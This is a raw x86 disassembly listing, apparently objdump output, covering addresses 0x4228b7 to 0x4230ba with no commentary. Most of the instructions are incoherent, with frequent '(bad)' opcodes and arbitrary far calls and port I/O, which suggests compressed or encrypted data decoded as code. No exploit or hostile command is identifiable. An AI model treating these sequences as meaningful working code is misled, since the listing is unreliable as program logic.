  4228b7:	sbb    ch,BYTE PTR [eax]
  4228b9:	iret   
  4228ba:	and    dh,BYTE PTR [ebx-0x3d42ea4d]
  4228c0:	sub    al,0x2b
  4228c2:	mov    esp,DWORD PTR [ecx]
  4228c4:	(bad)  
  4228c5:	pusha  
  4228c6:	add    eax,0xe354895e
  4228cb:	fdivr  st(0),st
  4228cd:	inc    edx
  4228ce:	add    BYTE PTR [eax],al
  4228d0:	add    BYTE PTR [eax],al
  4228d2:	add    dl,BYTE PTR ss:[ebp+0xc]
  4228d6:	jne    0x422937
  4228d8:	jg     0x422914
  4228da:	clc    
  4228db:	cs aas 
  4228dd:	push   0xf665c715
  4228e2:	xor    edx,eax
  4228e4:	add    DWORD PTR [eax],eax
  4228e6:	add    BYTE PTR fs:[eax],al
  4228e9:	add    BYTE PTR [eax-0x32],al
  4228ec:	int3   
  4228ed:	stos   BYTE PTR es:[edi],al
  4228ee:	xchg   esp,eax
  4228ef:	vunpcklpd ymm3,ymm4,YMMWORD PTR gs:[esi]
  4228f4:	pop    ss
  4228f5:	dec    ebx
  4228f6:	xor    DWORD PTR [edi-0x5e],esp
  4228f9:	push   ss
  4228fa:	(bad)  
  4228fc:	mov    al,ds:0xc8295395
  422901:	or     dl,BYTE PTR [ebx+0x33772f16]
  422907:	out    0x73,al
  422909:	jnp    0x42296d
  42290b:	mov    ds:0x542513d6,al
  422910:	sub    edx,DWORD PTR [eax-0x551eea65]
  422916:	ffree  st(5)
  422918:	pop    ds
  422919:	mov    dh,0x7
  42291b:	sub    al,0x94
  42291d:	jb     0x42294f
  42291f:	dec    esp
  422920:	xbegin 0xf1557ae1
  422926:	arpl   dx,cx
  422928:	sbb    ecx,ebp
  42292a:	add    bl,BYTE PTR [ebp+0x3cdb68e9]
  422930:	cmp    ebx,esp
  422932:	push   cs
  422933:	pop    esp
  422934:	aas    
  422935:	mov    ah,0x7
  422937:	iret   
  422938:	call   0xc64d0941
  42293d:	cmp    eax,0x9028635d
  422942:	jl     0x422906
  422944:	sbb    edx,DWORD PTR [ebx]
  422946:	dec    edx
  422947:	lock mov esi,DWORD PTR [eax]
  42294a:	fisub  DWORD PTR [edx+0xab1c]
  422950:	add    BYTE PTR [eax],al
  422952:	or     BYTE PTR [ecx-0x404c48e],dh
  422958:	dec    ecx
  422959:	mov    bl,0x94
  42295b:	je     0x422934
  42295d:	call   0xd097:0xc6bbaec7
  422964:	add    DWORD PTR [eax],eax
  422966:	add    BYTE PTR fs:[eax],al
  422969:	add    BYTE PTR [ebp+0x22fc23c5],al
  42296f:	cld    
  422970:	ds call 0xc691a9c4
  422976:	mov    ds:0xe4efa980,al
  42297b:	out    0xa5,eax
  42297d:	bound  edx,QWORD PTR [edi+0x7378ce6a]
  422983:	xlat   BYTE PTR ds:[ebx]
  422984:	pop    edx
  422985:	xchg   BYTE PTR [eax+ebp*1-0x4a],cl
  422989:	mov    ebp,DWORD PTR [edi-0x5a]
  42298c:	jge    0x422a02
  42298e:	adc    al,BYTE PTR [ebp+0x66a60c12]
  422994:	sbb    BYTE PTR [edx+eax*1+0x4e08e528],bl
  42299b:	je     0x422948
  42299d:	sub    BYTE PTR [edx+0x5e],bh
  4229a0:	out    0x1e,al
  4229a2:	or     dl,dh
  4229a4:	orps   xmm6,XMMWORD PTR [ebp+eax*2+0x63442782]
  4229ac:	out    0xb2,eax
  4229ae:	dec    ebp
  4229af:	pop    ecx
  4229b0:	fwait
  4229b1:	test   dl,dl
  4229b3:	or     eax,0x10c64cad
  4229b8:	sbb    eax,0xe46e65f6
  4229bd:	mov    edx,DWORD PTR [ebp+0x5017a056]
  4229c3:	call   0xb582:0x74d47a16
  4229ca:	inc    ebx
  4229cb:	je     0x42297d
  4229cd:	mov    ds:0x0,al
  4229d2:	fist   WORD PTR [ebx-0x4e]
  4229d5:	dec    edi
  4229d6:	mov    esi,0x67d3ffef
  4229db:	xchg   ecx,edi
  4229dd:	adc    al,0xab
  4229df:	sti    
  4229e0:	or     esp,edi
  4229e2:	sti    
  4229e3:	rol    BYTE PTR [ecx],1
  4229e5:	add    BYTE PTR [eax+eax*1+0x0],ah
  4229e9:	add    BYTE PTR [ebx+0x111f2b47],ah
  4229ef:	pop    ecx
  4229f0:	pusha  
  4229f1:	retf   0xb508
  4229f4:	lahf   
  4229f5:	inc    ecx
  4229f6:	mov    bh,0x1d
  4229f8:	imul   edi,edx,0xffffff98
  4229fb:	inc    esp
  4229fc:	cli    
  4229fd:	lahf   
  4229fe:	mov    bh,0x6c
  422a00:	xchg   ecx,eax
  422a01:	pop    edx
  422a02:	mov    ah,0xd2
  422a04:	xchg   ebp,eax
  422a05:	sahf   
  422a06:	pop    ds
  422a07:	lods   al,BYTE PTR ds:[esi]
  422a08:	pop    ebp
  422a09:	cs loopne 0x422a24
  422a0c:	nop
  422a0d:	inc    esi
  422a0e:	cmp    dl,0x34
  422a11:	ins    BYTE PTR es:[edi],dx
  422a12:	jno    0x422a56
  422a14:	ret    0x38a1
  422a17:	enter  0xf135,0x57
  422a1b:	jmp    0x422a79
  422a1d:	imul   BYTE PTR [edx-0x67650b9f]
  422a23:	enter  0x9543,0x33
  422a27:	add    eax,0x1c47cbd2
  422a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a2d:	inc    ebx
  422a2e:	push   eax
  422a2f:	sub    esp,DWORD PTR [edx-0xf988825]
  422a35:	push   ecx
  422a36:	push   0x66
  422a38:	push   esp
  422a39:	icebp  
  422a3a:	shr    DWORD PTR [eax],0x94
  422a3d:	dec    esp
  422a3e:	push   ebx
  422a3f:	mov    dh,0xe7
  422a41:	adc    BYTE PTR [ebp-0x397a816f],ch
  422a47:	sbb    BYTE PTR [esi],dl
  422a49:	sbb    al,BYTE PTR [eax+0x2f]
  422a4c:	jns    0x4229f0
  422a4e:	add    BYTE PTR [eax],al
  422a50:	add    BYTE PTR [eax],al
  422a52:	xchg   DWORD PTR [ebx+edx*8],ecx
  422a55:	fcmovu st,st(3)
  422a57:	fisttp WORD PTR [edi+0x640ccb5d]
  422a5d:	push   ss
  422a5e:	push   esp
  422a5f:	sar    DWORD PTR [edx+0x1d15f77],cl
  422a65:	add    BYTE PTR [eax+eax*1+0x0],ah
  422a69:	add    BYTE PTR [ebx-0x2c],al
  422a6c:	push   eax
  422a6d:	in     eax,0xb0
  422a6f:	(bad)  
  422a71:	sbb    BYTE PTR [edx],cl
  422a73:	push   es
  422a74:	ins    DWORD PTR es:[edi],dx
  422a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a76:	sub    BYTE PTR [eax+0x21],bh
  422a79:	xchg   esp,eax
  422a7a:	out    0x88,al
  422a7c:	mov    gs,esp
  422a7e:	jns    0x422a02
  422a80:	mov    ebp,0x76cebac7
  422a85:	xchg   edi,eax
  422a86:	pop    esi
  422a87:	jo     0x422a4d
  422a89:	push   esp
  422a8a:	data16 (bad) 
  422a8d:	adc    BYTE PTR [edx+0x11],0x82
  422a91:	aaa    
  422a92:	jecxz  0x422abd
  422a94:	cli    
  422a95:	jo     0x422ad3
  422a97:	sahf   
  422a98:	adc    DWORD PTR [ebp+0x541a0fd1],ebx
  422a9e:	repz sub esi,DWORD PTR [esp-0x64]
  422aa3:	call   0x4eb0d006
  422aa8:	rcl    BYTE PTR [edi+edi*4],0x80
  422aac:	mov    ds:0x7f6a232a,al
  422ab1:	mov    al,ds:0xc5e10ac5
  422ab6:	cmp    al,0x15
  422ab8:	imul   esp,edi,0x67
  422abb:	lea    ebp,[ebp-0x6d]
  422abe:	cdq    
  422abf:	adc    al,0x6a
  422ac1:	test   DWORD PTR ds:0x7268d2f9,esp
  422ac7:	ins    BYTE PTR es:[edi],dx
  422ac8:	xchg   esi,eax
  422ac9:	add    eax,0x68e13ace
  422ace:	add    BYTE PTR [eax],al
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	lahf   
  422ad3:	arpl   WORD PTR [ebp+0x72],cx
  422ad6:	std    
  422ad7:	jle    0x422a98
  422ad9:	out    dx,eax
  422ada:	sbb    edi,esp
  422adc:	mov    BYTE PTR [esp+ebp*4-0x3cfbb669],dh
  422ae3:	rol    DWORD PTR [ecx],1
  422ae5:	add    BYTE PTR [eax+eax*1+0x0],ah
  422ae9:	add    BYTE PTR [edi+0x6d],cl
  422aec:	ror    DWORD PTR ds:0x377de4cd,cl
  422af2:	sti    
  422af3:	pop    esp
  422af4:	sub    al,0xc2
  422af6:	fwait
  422af7:	push   0xe
  422af9:	pop    es
  422afa:	pushf  
  422afb:	enter  0x742d,0xbc
  422aff:	lahf   
  422b00:	imul   BYTE PTR [ecx+0x5bf2205]
  422b06:	cli    
  422b07:	ja     0x422aed
  422b09:	inc    eax
  422b0a:	nop
  422b0b:	mov    cl,0x30
  422b0d:	imul   esp,DWORD PTR [esi],0x5d
  422b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b11:	pop    ss
  422b12:	mov    edx,0x52f5ddd1
  422b17:	test   DWORD PTR [esi-0x632c6f1],0x18edfd72
  422b21:	arpl   si,bp
  422b23:	mov    esp,0xcf819c7f
  422b28:	cli    
  422b29:	sar    DWORD PTR [edx-0x37],0x10
  422b2d:	stos   BYTE PTR es:[edi],al
  422b2e:	add    cl,BYTE PTR [edx+0x10ccb6ec]
  422b34:	popa   
  422b35:	cmp    al,0x3c
  422b37:	xor    DWORD PTR ds:0xde00ec17,esp
  422b3d:	jle    0x422b6b
  422b3f:	pop    ebx
  422b40:	std    
  422b41:	push   ebp
  422b42:	cmc    
  422b43:	sub    ebp,DWORD PTR [edx+0x693ddd57]
  422b49:	dec    ebx
  422b4a:	std    
  422b4b:	out    0xcd,al
  422b4d:	jne    0x422b4f
  422b4f:	add    BYTE PTR [eax],al
  422b51:	add    BYTE PTR [eax+0x23],dh
  422b54:	and    eax,0x7c6f7769
  422b59:	cmp    esp,DWORD PTR [eax+0x41bcee1c]
  422b5f:	fisttp DWORD PTR [edx+0x1d227a6]
  422b65:	add    BYTE PTR [eax+eax*1+0x0],ah
  422b69:	add    BYTE PTR [edi],bl
  422b6b:	sub    eax,0x14428bd6
  422b70:	or     eax,0x55999324
  422b75:	inc    edi
  422b76:	pop    edi
  422b77:	dec    esp
  422b78:	(bad)  
  422b79:	(bad)
  422b7c:	pop    esi
  422b7d:	push   0xfc5f20ab
  422b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b83:	push   esi
  422b84:	lock in al,dx
  422b86:	sbb    dl,BYTE PTR [ebp-0x7c]
  422b89:	pop    ebx
  422b8a:	dec    esi
  422b8b:	mov    eax,0xb4a7c4de
  422b90:	inc    esp
  422b91:	dec    edx
  422b92:	cmp    DWORD PTR [edx],0xd7bd8f40
  422b98:	ror    edi,0x96
  422b9b:	jg     0x422bdb
  422b9d:	aaa    
  422b9e:	imul   esp
  422ba0:	cmp    esp,eax
  422ba2:	inc    ebx
  422ba3:	sub    DWORD PTR [ecx-0x5b381aaf],0x5
  422baa:	xchg   esi,eax
  422bab:	rcr    BYTE PTR [eax+0x111b86df],cl
  422bb1:	add    eax,0xc6dc0461
  422bb6:	mov    bl,0x1d
  422bb8:	xchg   ebx,eax
  422bb9:	mov    esi,0x405ce945
  422bbe:	cmp    bh,cl
  422bc0:	xchg   ebp,eax
  422bc1:	or     eax,0xd027131b
  422bc6:	mov    bh,0x95
  422bc8:	ret    0x2d8f
  422bcb:	leave  
  422bcc:	mov    al,ds:0x82
  422bd1:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  422bd8:	popf   
  422bd9:	aam    0x57
  422bdb:	(bad)
  422bdf:	sub    BYTE PTR [edx],cl
  422be1:	sbb    al,0x8b
  422be3:	rol    BYTE PTR [ecx],cl
  422be5:	add    BYTE PTR [eax+eax*1+0x0],ah
  422be9:	add    BYTE PTR [ecx],bh
  422beb:	inc    DWORD PTR [ebx+edx*4-0x21d0acda]
  422bf2:	loop   0x422bcc
  422bf4:	dec    edx
  422bf5:	mov    esi,DWORD PTR ds:0xdaeed997
  422bfb:	(bad)  
  422bfc:	ffreep st(5)
  422bfe:	pop    ds
  422bff:	ror    bl,1
  422c01:	jle    0x422bdd
  422c03:	lea    ebx,[ecx+0x4f]
  422c06:	mov    ds:0x25db96fe,al
  422c0b:	in     eax,dx
  422c0c:	sub    DWORD PTR [edx+0x575a3294],ebx
  422c12:	sbb    ecx,eax
  422c14:	dec    edx
  422c15:	cmp    ah,ch
  422c17:	ss mov bh,0xf5
  422c1a:	ror    DWORD PTR [ecx+ebx*1+0x583b4351],1
  422c21:	jnp    0x422c62
  422c23:	push   ds
  422c24:	gs inc ecx
  422c26:	jns    0x422bdd
  422c28:	mov    ds:0x15a6315f,al
  422c2d:	cmp    eax,0xbdd0cd17
  422c32:	fldcw  WORD PTR gs:[eiz*8-0x63d8d952]
  422c3a:	les    edi,FWORD PTR [ebx+ebx*8-0x6c]
  422c3e:	rcr    DWORD PTR [esi],cl
  422c40:	mov    DWORD PTR [ebp-0x7dec129f],esp
  422c46:	add    DWORD PTR [ecx+0x10a46873],0xd20b
  422c50:	add    BYTE PTR [eax],al
  422c52:	hlt    
  422c53:	mov    dl,0x32
  422c55:	(bad)  
  422c56:	jbe    0x422c2e
  422c58:	hlt    
  422c59:	mov    dl,0xb1
  422c5b:	and    al,0xfe
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	sbb    DWORD PTR [ebx-0x2d10cee9],ebx
  422c64:	add    DWORD PTR [eax],eax
  422c66:	add    BYTE PTR fs:[eax],al
  422c69:	add    BYTE PTR [esi],al
  422c6b:	js     0x422cbc
  422c6d:	cmp    DWORD PTR ds:0xae1c009f,ebx
  422c73:	mov    DWORD PTR [ebx+eax*8],eax
  422c76:	call   0x6902:0xf84a5119
  422c7d:	sub    DWORD PTR [edx+ebx*1-0x35],0xffffffc7
  422c82:	mov    edi,0x87734dd9
  422c87:	pushf  
  422c88:	fs sub ch,dh
  422c8b:	iret   
  422c8c:	ret    
  422c8d:	sbb    esi,DWORD PTR [ecx+0xf]
  422c90:	mov    ds:0x78bed3a3,al
  422c95:	cmc    
  422c96:	fiadd  WORD PTR [edi-0x6c964d25]
  422c9c:	pop    edx
  422c9d:	fidivr DWORD PTR [ebp+0x4f]
  422ca0:	push   eax
  422ca1:	rcr    BYTE PTR [edi-0x77],1
  422ca4:	les    ecx,FWORD PTR [edi+0x76]
  422ca7:	xor    ch,BYTE PTR [esi+0x4009b192]
  422cad:	push   eax
  422cae:	mov    ch,0x6c
  422cb0:	xchg   esi,eax
  422cb1:	lock in eax,dx
  422cb3:	mov    al,0xb0
  422cb5:	mov    dl,0x25
  422cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cb8:	retf   
  422cb9:	sub    eax,0x38
  422cbc:	push   edx
  422cbd:	inc    edi
  422cbe:	add    DWORD PTR [eax-0x47916e83],ebx
  422cc4:	stc    
  422cc5:	push   esp
  422cc6:	or     BYTE PTR [ebx+0x1bac680b],ch
  422ccc:	clc    
  422ccd:	jne    0x422ccf
  422ccf:	add    BYTE PTR [eax],al
  422cd1:	add    BYTE PTR [edx],dh
  422cd3:	ror    esi,cl
  422cd5:	mov    ds:0xd37ebfef,al
  422cda:	sub    edi,DWORD PTR [esi]
  422cdc:	out    0x3f,eax
  422cde:	xor    eax,0x53c17265
  422ce3:	rol    DWORD PTR [ecx],cl
  422ce5:	add    BYTE PTR [eax+eax*1+0x0],ah
  422ce9:	add    ch,cl
  422ceb:	bound  esp,QWORD PTR [esi-0x2f402e2b]
  422cf1:	ss push eax
  422cf3:	mov    DWORD PTR [esi],ecx
  422cf5:	bswap  ebp
  422cf7:	ret    
  422cf8:	inc    ecx
  422cf9:	dec    esp
  422cfa:	loop   0x422ce6
  422cfc:	and    ebx,DWORD PTR ds:0xf580deae
  422d02:	push   0x433f030d
  422d07:	icebp  
  422d08:	pop    edi
  422d09:	shl    BYTE PTR [ecx+0x70f62007],cl
  422d0f:	repnz (bad) 
  422d12:	icebp  
  422d13:	pop    esp
  422d14:	jl     0x422d38
  422d16:	jno    0x422cfa
  422d18:	mov    edx,0x8f814c0b
  422d1d:	sti    
  422d1e:	xor    DWORD PTR [esi],0xa8672317
  422d24:	mov    esp,0x49231049
  422d29:	push   eax
  422d2a:	loop   0x422d38
  422d2c:	xor    esi,DWORD PTR [esi+esi*4-0x4e]
  422d30:	shl    BYTE PTR [edi+0xc099f35],1
  422d36:	add    DWORD PTR [esi-0x72d36b82],ebx
  422d3c:	mov    eax,ds:0xe25b5ea1
  422d41:	mov    ah,0xcb
  422d43:	push   edx
  422d44:	xor    eax,0xd1acd231
  422d49:	cld    
  422d4a:	cmp    ch,ch
  422d4c:	cmovl  eax,DWORD PTR [eax]
  422d4f:	add    BYTE PTR [eax],al
  422d51:	add    bl,bl
  422d53:	in     eax,dx
  422d54:	outs   dx,BYTE PTR ds:[esi]
  422d55:	and    bh,BYTE PTR [esi-0x5d]
  422d58:	(bad)  
  422d5a:	pop    esi
  422d5b:	(bad)  
  422d5c:	mov    DWORD PTR [ebp+0x196d983b],ecx
  422d62:	mov    bh,0xd3
  422d64:	add    DWORD PTR [eax],eax
  422d66:	add    BYTE PTR fs:[eax],al
  422d69:	add    BYTE PTR [esi+0x56],cl
  422d6c:	fisttp DWORD PTR [ecx-0x19]
  422d6f:	jge    0x422d96
  422d71:	(bad)  
  422d73:	push   ebx
  422d74:	data16 jo 0x422d94
  422d77:	mov    al,0x55
  422d79:	cs scas al,BYTE PTR es:[edi]
  422d7b:	fs ss inc edx
  422d7e:	idiv   BYTE PTR [esi+edx*4-0x66a4098c]
  422d85:	repnz dec ebp
  422d87:	xor    eax,DWORD PTR [eax-0x28d4c756]
  422d8d:	(bad)  
  422d8e:	les    eax,FWORD PTR [esi]
  422d90:	fcomip st,st(4)
  422d92:	and    ch,0x55
  422d95:	ret    0xf18c
  422d98:	xchg   ebx,eax
  422d99:	sti    
  422d9a:	test   DWORD PTR [edx-0x4e],ecx
  422d9d:	test   BYTE PTR [ecx+ebx*8+0x204d85f0],0xe5
  422da5:	loope  0x422e20
  422da7:	adc    esi,DWORD PTR [ebp+0x346025cb]
  422dad:	arpl   WORD PTR [edx],di
  422daf:	push   cs
  422db0:	pop    edx
  422db1:	pop    ebx
  422db2:	adc    al,0x58
  422db4:	and    al,0x22
  422db6:	int    0xba
  422db8:	lods   al,BYTE PTR ds:[esi]
  422db9:	jne    0x422d7f
  422dbb:	cmp    BYTE PTR [edi+0xa],dh
  422dbe:	(bad)  
  422dbf:	rol    BYTE PTR [ebx+0x4fb59159],0x6f
  422dc6:	or     BYTE PTR [edx+eiz*8],bh
  422dc9:	adc    ebp,DWORD PTR [esi]
  422dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dcc:	imul   ecx,DWORD PTR [edi+0x0],0x0
  422dd0:	add    BYTE PTR [eax],al
  422dd2:	add    eax,0x6f976b22
  422dd7:	(bad)  
  422dd9:	mov    dl,0x66
  422ddb:	and    BYTE PTR [esi+0x5e19416a],ah
  422de1:	loopne 0x422dfe
  422de3:	aam    0x1
  422de5:	add    BYTE PTR [eax+eax*1+0x0],ah
  422de9:	add    al,bl
  422deb:	call   0x42e8:0x7381d697
  422df2:	inc    esp
  422df3:	call   0x67f4432a
  422df8:	push   0x271214b5
  422dfd:	push   ebx
  422dfe:	rol    DWORD PTR [esp+eiz*2+0x403bf0c9],1
  422e05:	cmp    DWORD PTR [edx],edx
  422e07:	out    dx,al
  422e08:	xchg   DWORD PTR [ebp+eax*2+0x43],edi
  422e0c:	loope  0x422e2b
  422e0e:	dec    edi
  422e0f:	sbb    eax,0x78f0871c
  422e14:	jns    0x422e77
  422e16:	push   ds
  422e17:	outs   dx,BYTE PTR ss:[esi]
  422e19:	and    BYTE PTR [edi-0x3bd21f0a],al
  422e1f:	mov    esi,0xd057154f
  422e24:	cld    
  422e25:	mov    ch,0xb
  422e27:	xchg   ebx,eax
  422e28:	mov    esi,0x2b878028
  422e2d:	test   DWORD PTR [ebx-0x2d],esi
  422e30:	not    al
  422e32:	fdivr  QWORD PTR [ebx+0x3c]
  422e35:	sbb    DWORD PTR [edi-0x22],edi
  422e38:	std    
  422e39:	fmul   DWORD PTR ss:[ebp+0x20]
  422e3d:	xlat   BYTE PTR ds:[ebx]
  422e3e:	cmp    bh,BYTE PTR [edi+0x25]
  422e41:	aas    
  422e42:	sbb    eax,0xedefcd98
  422e47:	fidivr WORD PTR [ebx+esi*4-0x1d]
  422e4b:	sub    esp,ebx
  422e4d:	push   0x0
  422e4f:	add    BYTE PTR [eax],al
  422e51:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e57:	stc    
  422e58:	call   esi
  422e5a:	into   
  422e5b:	inc    ebp
  422e5c:	mov    bh,0x11
  422e5e:	ficomp WORD PTR [edx+0x6e]
  422e61:	outs   dx,DWORD PTR ds:[esi]
  422e62:	jg     0x422e38
  422e64:	add    DWORD PTR [eax],eax
  422e66:	add    BYTE PTR fs:[eax],al
  422e69:	add    dl,bh
  422e6b:	retf   
  422e6c:	sbb    BYTE PTR [edx],dh
  422e6e:	cmp    BYTE PTR [ebx+0x71],dh
  422e71:	adc    eax,DWORD PTR [edi-0x2f]
  422e74:	jno    0x422eaa
  422e76:	sub    DWORD PTR [eax],ebp
  422e78:	mov    edx,0xf1f8b2d9
  422e7d:	mov    esp,DWORD PTR [ebx+esi*8]
  422e80:	aaa    
  422e81:	(bad)  
  422e82:	jmp    FWORD PTR [ecx]
  422e84:	xchg   DWORD PTR [ecx-0x770ff72f],edi
  422e8a:	sub    eax,0x206a6a7d
  422e8f:	dec    esi
  422e90:	test   al,0x3
  422e92:	or     ecx,DWORD PTR [edx-0x47560fa5]
  422e98:	inc    edi
  422e99:	pop    ebx
  422e9a:	inc    eax
  422e9b:	int3   
  422e9c:	mov    esi,DWORD PTR [eax+eiz*2]
  422e9f:	mov    esi,0x4a030091
  422ea4:	pop    es
  422ea5:	popa   
  422ea6:	neg    BYTE PTR [esi]
  422ea8:	test   ebp,ecx
  422eaa:	nop
  422eab:	pop    ebp
  422eac:	popa   
  422ead:	jae    0x422e55
  422eaf:	arpl   WORD PTR [ecx+edx*2+0xe],di
  422eb3:	or     al,0xf8
  422eb5:	mov    BYTE PTR [eax],ch
  422eb7:	xor    edx,DWORD PTR [ecx+0x47]
  422eba:	(bad)  
  422ebd:	out    dx,al
  422ebe:	xchg   edi,eax
  422ebf:	sub    edi,DWORD PTR [eax-0x5e]
  422ec2:	js     0x422eb2
  422ec4:	ins    DWORD PTR es:[edi],dx
  422ec5:	sti    
  422ec6:	push   ecx
  422ec7:	call   0x7fa650a4
  422ecc:	les    edx,FWORD PTR [ecx]
  422ece:	add    BYTE PTR [eax],al
  422ed0:	add    BYTE PTR [eax],al
  422ed2:	fisubr WORD PTR [ecx]
  422ed4:	cwde   
  422ed5:	sar    bh,cl
  422ed7:	repz fisubr WORD PTR ds:0x4af35f6
  422ede:	inc    esp
  422edf:	sbb    bl,BYTE PTR [ebx+0x1d4e3fb]
  422ee5:	add    BYTE PTR [eax+eax*1+0x0],ah
  422ee9:	add    BYTE PTR [edx+0x1a],dl
  422eec:	mov    eax,eax
  422eee:	call   0x83cd:0xb7a689bf
  422ef5:	add    al,0x6b
  422ef7:	dec    edx
  422ef8:	aam    0x84
  422efa:	dec    ebx
  422efb:	fnsave [ebx+esi*8-0x7b126351]
  422f02:	sub    BYTE PTR [edi-0x6d],cl
  422f05:	cmp    al,0xfd
  422f07:	dec    sp
  422f09:	mov    al,ds:0x19630b2a
  422f0e:	idiv   BYTE PTR [edi-0x794ce207]
  422f14:	(bad)  
  422f15:	inc    ecx
  422f16:	nop
  422f17:	mov    bl,BYTE PTR [edx+esi*1]
  422f1a:	imul   eax,DWORD PTR [eax],0xadbe8aa7
  422f20:	mov    ch,BYTE PTR [ebx]
  422f22:	sub    eax,0xb8bc25ca
  422f27:	xchg   esp,eax
  422f28:	out    dx,eax
  422f29:	arpl   si,bx
  422f2b:	dec    esi
  422f2c:	cmp    dl,BYTE PTR [ecx-0x51]
  422f2f:	cmp    dl,BYTE PTR [eax+0x6d]
  422f32:	jmp    0x665c173f
  422f37:	mov    eax,ds:0xb9005c03
  422f3c:	(bad)  
  422f3d:	xchg   BYTE PTR [ebx+0x5dc9f41],bl
  422f43:	sub    al,0x22
  422f45:	and    eax,0xb33be169
  422f4a:	ins    BYTE PTR es:[edi],dx
  422f4b:	push   ss
  422f4c:	aam    0xe8
  422f4e:	add    BYTE PTR [eax],al
  422f50:	add    BYTE PTR [eax],al
  422f52:	dec    esi
  422f53:	aas    
  422f54:	int3   
  422f55:	sbb    eax,0x7fdffffd
  422f5a:	out    dx,eax
  422f5b:	loopne 0x422f73
  422f5d:	lods   al,BYTE PTR ds:[esi]
  422f5e:	jne    0x422f3a
  422f60:	or     al,0x90
  422f62:	inc    edi
  422f63:	aad    0x1
  422f65:	add    BYTE PTR [eax+eax*1+0x0],ah
  422f69:	add    BYTE PTR [edx-0x7c0cd876],dh
  422f6f:	les    edx,FWORD PTR [ebp+0x8]
  422f72:	(bad)  
  422f73:	cmp    eax,0x3a555387
  422f78:	shl    BYTE PTR [eax],cl
  422f7a:	int    0x89
  422f7c:	mov    ds:0xf9b52c2e,al
  422f81:	mov    cl,0x90
  422f83:	adc    ebp,esi
  422f85:	adc    dl,al
  422f87:	and    DWORD PTR [esi+ebp*2-0x10],0xcb6d3b69
  422f8f:	outs   dx,DWORD PTR ds:[esi]
  422f90:	icebp  
  422f91:	sar    DWORD PTR [ecx+0x6123b056],1
  422f97:	fwait
  422f98:	lds    ebx,FWORD PTR [edx+edi*4+0x28]
  422f9c:	jle    0x422f82
  422f9e:	out    dx,eax
  422f9f:	mov    edi,0x30bfebc2
  422fa4:	cs push es
  422fa6:	push   0x459088f8
  422fab:	in     eax,0x13
  422fad:	add    BYTE PTR [edi-0x489135b2],bl
  422fb3:	xor    ecx,ebp
  422fb5:	fidiv  DWORD PTR [eax+0x4bf424d2]
  422fbb:	push   ebx
  422fbc:	ins    DWORD PTR es:[edi],dx
  422fbd:	inc    edx
  422fbe:	mov    cl,0x6f
  422fc0:	xchg   ebp,eax
  422fc1:	or     ecx,0x22
  422fc4:	cmp    DWORD PTR [esi-0x5bb7f732],0x17ab984a
  422fce:	add    BYTE PTR [eax],al
  422fd0:	add    BYTE PTR [eax],al
  422fd2:	push   ds
  422fd3:	test   eax,0x7ff735f6
  422fd8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fde:	adc    BYTE PTR [eax+ebx*2+0x1d5abab],0x0
  422fe6:	add    BYTE PTR fs:[eax],al
  422fe9:	add    BYTE PTR [edi],ah
  422feb:	cwde   
  422fec:	dec    edi
  422fed:	adc    eax,0x5c453e1
  422ff2:	xchg   ebx,ecx
  422ff4:	mov    gs,WORD PTR ds:0xee270861
  422ffa:	jp     0x42305b
  422ffc:	push   edx
  422ffd:	cli    
  422ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fff:	out    dx,al
  423000:	cmp    al,0x53
  423002:	in     al,0x38
  423004:	dec    ebx
  423005:	test   al,0x31
  423007:	js     0x423004
  423009:	jmp    0xf8fb:0x5a870fe2
  423010:	repnz scas al,BYTE PTR es:[edi]
  423012:	dec    edi
  423013:	shrd   DWORD PTR cs:[ebx+eiz*1-0x21],edi,cl
  423019:	call   0x2b6b:0x92ce2d6b
  423020:	in     al,0x89
  423022:	icebp  
  423023:	add    al,0x71
  423025:	loop   0x422fff
  423027:	std    
  423028:	dec    esp
  423029:	inc    BYTE PTR [ebx]
  42302b:	mov    esp,0xca7296b1
  423030:	xchg   cl,dh
  423032:	retf   0xf454
  423035:	jne    0x42303a
  423037:	loope  0x423017
  423039:	fcomi  st,st(2)
  42303b:	aaa    
  42303c:	dec    DWORD PTR [ebp-0xd]
  42303f:	inc    ecx
  423040:	xchg   edx,eax
  423041:	pop    ebp
  423042:	jmp    0xff1c:0x238026c1
  423049:	out    dx,al
  42304a:	mov    ah,0x7d
  42304c:	xchg   edi,eax
  42304d:	xchg   edx,eax
  42304e:	add    BYTE PTR [eax],al
  423050:	add    BYTE PTR [eax],al
  423052:	fwait
  423053:	loope  0x4230c2
  423055:	sub    eax,0xf7dbad7f
  42305a:	sar    BYTE PTR [ebx],cl
  42305c:	(bad)  
  42305d:	add    BYTE PTR [eax],bh
  42305f:	aaa    
  423060:	push   edx
  423061:	lock (bad) 
  423064:	add    DWORD PTR [eax],eax
  423066:	add    BYTE PTR fs:[eax],al
  423069:	add    BYTE PTR [ebp-0x8],ah
  42306c:	repnz mov ecx,0x2f83f8ba
  423072:	cli    
  423073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423074:	cmp    DWORD PTR ds:0xa8e60955,ebx
  42307a:	fs imul esp,edx,0x21
  42307e:	push   ebx
  42307f:	xchg   esp,eax
  423080:	mov    eax,0x4e430396
  423085:	std    
  423086:	mov    dh,0x1a
  423088:	add    edx,DWORD PTR [ecx]
  42308a:	adc    DWORD PTR [ebx*2+0x3c425828],edx
  423091:	call   0x1c51fd40
  423096:	mov    WORD PTR ds:0xa1659f8,ss
  42309c:	lods   al,BYTE PTR ds:[esi]
  42309d:	xor    al,0x2a
  42309f:	es aam 0xd7
  4230a2:	pop    edx
  4230a3:	xor    BYTE PTR [edi+eiz*2+0x7a666a77],dh
  4230aa:	mov    esp,0xc8d4b0ad
  4230af:	adc    bl,dl
  4230b1:	stos   DWORD PTR es:[edi],eax
  4230b2:	cmp    cl,BYTE PTR [ecx-0x1a]
  4230b5:	sbb    eax,0x6bc5dd46
  4230ba:	fcomi  st,st(0)
